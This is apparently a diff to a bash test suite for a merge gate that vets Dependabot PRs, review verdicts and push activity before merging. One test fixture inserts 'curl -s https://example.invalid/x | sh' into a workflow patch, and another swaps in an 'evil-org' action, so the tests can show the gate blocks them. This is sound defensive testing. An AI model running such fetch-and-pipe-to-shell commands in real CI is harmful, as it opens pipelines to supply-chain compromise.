@@ -16,8 +16,8 @@ SHA_A=3d3c42e5aac5ba805825da76410c181273ba90b1; SHA_B=de0fac2e4500dabe0009e67214
 USES_BUMP=$'@@ -20,3 +20,3 @@ jobs:\n     steps:\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/checkout@'"$SHA_B"$' # v7.0.2\n       - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0'
 DEP_COMMIT='{"sha":"74cf1910000000000000000000000000000000aa","author":{"login":"dependabot[bot]"},"committer":{"login":"web-flow"},"commit":{"verification":{"verified":true}}}'
 NO_FORCE='{"data":{"repository":{"pullRequest":{"timelineItems":{"nodes":[]}}}}}'
-# Optional overrides for the next write_fixture (reset after each): RUNS / FORCE / PRCOMMITS / PRFILES (raw JSON as the API returns it)
-RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""
+# Optional overrides for the next write_fixture (reset after each): ACTIVITY / RUNS / FORCE / PRCOMMITS / PRFILES (raw JSON as the API returns it)
+ACTIVITY=""; RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""
 write_fixture() { # <head> <base> <mergeState> <comments-json-array> <files-json-array> <checks-json> <behind> [author] [commits-json]
   jq -n --arg head "$1" --arg base "$2" --arg mss "$3" --argjson comments "$4" --argjson files "$5" --arg t "$HEAD_TIME" \
     --arg author "${8:-duochou042004}" --argjson commits "${9:-null}" \
@@ -25,14 +25,17 @@ write_fixture() { # <head> <base> <mergeState> <comments-json-array> <files-json
       comments:$comments,files:$files,commits:($commits // [{committedDate:"2026-09-25T09:00:00Z"},{committedDate:$t}])}' >"$MOCK_DIR/pr.json"
   echo "$6" >"$MOCK_DIR/checks.json"
   echo "$7" >"$MOCK_DIR/behind.txt"
-  # Push time (T-M1.7): by default the head arrived on the PR at HEAD_TIME (its pull_request runs were created then) and there was no force-push.
+  # Push time (T-M1.7): by default the head was pushed at HEAD_TIME (repository activity; by Dependabot on a Dependabot PR, which created the branch),
+  # its pull_request runs were created then, and there was no force-push.
+  echo "${ACTIVITY:-$(jq -n --arg t "$HEAD_TIME" --arg a "${8:-duochou042004}" '[{activity_type:(if $a == "app/dependabot" then "branch_creation" else "push" end),
+      after:"abc1234def5678", timestamp:$t, actor:{login:(if $a == "app/dependabot" then "dependabot[bot]" else $a end)}}]')}" >"$MOCK_DIR/activity.json"
   echo "${RUNS:-$(jq -n --arg b "$1" --arg t "$HEAD_TIME" '{workflow_runs:[{event:"pull_request",head_sha:"abc1234def5678",head_branch:$b,created_at:$t}]}')}" >"$MOCK_DIR/runs.json"
   echo "${FORCE:-$NO_FORCE}" >"$MOCK_DIR/forcepush.json"
   echo "${PRCOMMITS:-[$DEP_COMMIT]}" >"$MOCK_DIR/pr-commits.json"
   echo "${PRFILES:-$(jq -c --arg bump "$USES_BUMP" '[.[] | {filename:.path, status:"modified",
       patch:(if (.path | startswith(".github/workflows/")) then $bump else "@@ -1 +1 @@\n-a\n+b" end)}]' <<<"$5")}" >"$MOCK_DIR/pr-files.json"
   rm -f "$MOCK_DIR/merged.txt" "$MOCK_DIR"/*.fail
-  RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""
+  ACTIVITY=""; RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""
 }
 gate() { "$ROOT/scripts/merge-gate.sh" "$@"; }
 OK_CHECKS='[{"name":"docs-check","bucket":"pass"},{"name":"secrets-scan","bucket":"pass"},{"name":"backend","bucket":"pass"},{"name":"web","bucket":"pass"},{"name":"contract-drift","bucket":"pass"},{"name":"e2e-smoke","bucket":"pass"}]'
@@ -214,11 +217,11 @@ expect_exit 1 "AC3: a commits API error fails closed" -- gate --dry-run 7
 PRFILES=$(jq -nc --arg p $'@@ -30,2 +30,3 @@\n       - uses: actions/checkout@'"$SHA_A"$'\n+      - run: curl -s https://example.invalid/x | sh\n       - run: pnpm install' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
 dep '[{"path":".github/workflows/web.yml"}]'
 expect_exit 1 "AC3: a workflow edit that is not a uses: bump blocks" -- gate --dry-run 7
-expect_output_contains "only 'uses: <action>@<sha>' bumps may change" "explains the workflow rule"
+expect_output_contains "only 'uses: <action>@<sha>' SHA bumps may change" "explains the workflow rule"
 PRFILES=$(jq -nc --arg p $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: evil-org/checkout@'"$SHA_B" '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
 dep '[{"path":".github/workflows/web.yml"}]'
 expect_exit 1 "AC3: a uses: line that swaps the action (not a bump) blocks" -- gate --dry-run 7
-expect_output_contains "must keep the same actions" "explains the same-action rule"
+expect_output_contains "a bump keeps the line up to '@'" "explains the same-action rule"
 PRFILES=$(jq -nc --arg p $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@v7' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
 dep '[{"path":".github/workflows/web.yml"}]'
 expect_exit 1 "AC3: a uses: bump to a tag instead of a 40-hex SHA blocks" -- gate --dry-run 7
@@ -244,5 +247,63 @@ PRFILES='[{"filename":"backend/pom.xml","status":"modified","patch":"x"},{"filen
 dep '[{"path":"backend/pom.xml"}]'
 expect_exit 1 "AC3: the file list is taken from the files API, not only from pr view" -- gate --dry-run 7
 expect_output_contains "outside the allow-list" "names the allow-list"
+
+# ---- T-M1.7 review round 1 (DOCS-REVIEW findings) ----
+wf() { PRFILES=$(jq -nc --arg p "$1" '[{filename:".github/workflows/docs-check.yml",status:"modified",patch:$p}]'); dep '[{"path":".github/workflows/docs-check.yml"}]'; }
+SHA_P=5fda3b95a4ea91299a34e894583c3862153e4b97
+wf $'@@ -20,6 +20,6 @@ jobs:\n     steps:\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/setup-python@'"$SHA_P"$' # v7.0.0\n         with:\n           persist-credentials: false\n-      - uses: actions/setup-python@'"$SHA_P"$' # v7.0.0\n+      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n         with:'
+expect_exit 1 "S2-1: swapping two uses: lines (no SHA change) blocks" -- gate --dry-run 7
+wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+    uses: actions/checkout@'"$SHA_B"
+expect_exit 1 "S2-1: re-indenting a uses: line blocks" -- gate --dry-run 7
+wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/checkout@'"$SHA_A"$' # v7.0.2'
+expect_exit 1 "S2-1: a uses: line that keeps its SHA is not a bump" -- gate --dry-run 7
+expect_output_contains "keeps its SHA" "explains the same-SHA refusal"
+wf $'@@ -20,4 +20,4 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n       - run: |\n           echo x\n+          uses: actions/checkout@'"$SHA_B"
+expect_exit 1 "S2-1: moving a uses: line into a run: block blocks" -- gate --dry-run 7
+wf $'@@ -20,2 +20,2 @@\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n-      - uses: actions/setup-node@'"$SHA_P"$'\n+      - uses: actions/checkout@'"$SHA_B"$' # v7.0.2\n+      - uses: actions/setup-node@'"$SHA_A"
+expect_exit 0 "S2-1: two adjacent pairwise SHA bumps pass" -- gate --dry-run 7
+PRFILES='[{"filename":"evil/pom.xml","status":"added","patch":"x"},{"filename":"backend/pom.xml","status":"removed","patch":"x"}]'
+dep '[{"path":"backend/pom.xml"}]'
+expect_exit 1 "S3-4: adding or removing manifests on a Dependabot PR blocks" -- gate --dry-run 7
+expect_output_contains "may only modify existing files" "explains the modified-only rule"
+for neg in 'QA-VERDICT  T-M9.9: FAIL' 'qa-verdict T-M9.9: FAIL' 'QA-VERDICT T-M9.9 : FAIL' '**QA-VERDICT T-M9.9: FAIL**' '`QA-VERDICT T-M9.9: FAIL`' '> QA-VERDICT T-M9.9: FAIL' 'ux-review t-m9.9: changes requested'; do
+  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
+  expect_exit 1 "S3-1: a non-exact negative verdict blocks: '$neg'" -- gate --dry-run 7
+done
+write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.90: FAIL')" "$(c '**qa-verdict T-M9.9: pass**')")" "$FILES" "$OK_CHECKS" 0
+expect_exit 0 "S3-1: a negative for another id does not block, and a sloppy positive is simply ignored" -- gate --dry-run 7
+write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c '**QA-VERDICT T-M9.9: FAIL**')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
+expect_exit 0 "S3-1: an exact PASS after a non-exact FAIL wins (latest within the type)" -- gate --dry-run 7
+ACTIVITY=$(jq -n --arg t "$LATE" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"x"}}]')
+write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
+expect_exit 1 "S3-2: a push recorded in the repository activity after the verdict makes it stale (even without a new run)" -- gate --dry-run 7
+ACTIVITY='[{"activity_type":"push","after":"0000000","timestamp":"2026-09-25T09:00:00Z","actor":{"login":"x"}}]'
+write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
+expect_exit 1 "S3-2: no activity entry for the head fails closed" -- gate --dry-run 7
+expect_output_contains "no push of it to 'chore/T-M9.9-x' in the repository activity" "explains the activity refusal"
+write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0; touch "$MOCK_DIR/activity.json.fail"
+expect_exit 1 "S3-2: an activity API error fails closed" -- gate --dry-run 7
+ACTIVITY='{"message":"Not Found"}'
+write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
+expect_exit 1 "S3-2: an activity answer that is not a list fails closed" -- gate --dry-run 7
+ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"1111",timestamp:"2026-09-25T08:00:00Z",actor:{login:"dependabot[bot]"}},
+  {activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"duochou042004"}}]')
+dep '[{"path":"backend/pom.xml"}]'
+expect_exit 1 "S3-3: a push by a human to a Dependabot branch (per the repository activity) blocks" -- gate --dry-run 7
+expect_output_contains "activity not by Dependabot: push by duochou042004" "names the foreign push"
+ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"1",timestamp:"2026-09-24T08:00:00Z",actor:{login:"duochou042004"}},
+  {activity_type:"branch_deletion",after:"0",timestamp:"2026-09-24T09:00:00Z",actor:{login:"duochou042004"}},
+  {activity_type:"branch_creation",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
+dep '[{"path":"backend/pom.xml"}]'
+expect_exit 0 "S3-3: activity before Dependabot (re)created the branch does not count" -- gate --dry-run 7
+ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
+dep '[{"path":"backend/pom.xml"}]'
+expect_exit 1 "S3-3: a Dependabot branch without a recorded creation fails closed" -- gate --dry-run 7
+RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:05:00.500Z")
+write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$AFTER")" "$(c 'LC-APPROVED T-M9.9' "$AFTER")")" "$FILES" "$OK_CHECKS" 0
+expect_exit 1 "S4-1: a run at 10:05:00.500Z makes a 10:05:00Z verdict stale (no string-order trick)" -- gate --dry-run 7
+RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:00:00+00:00")
+write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
+expect_exit 1 "S4-1: an unparsable (non-Z) run time fails closed" -- gate --dry-run 7
 
 finish
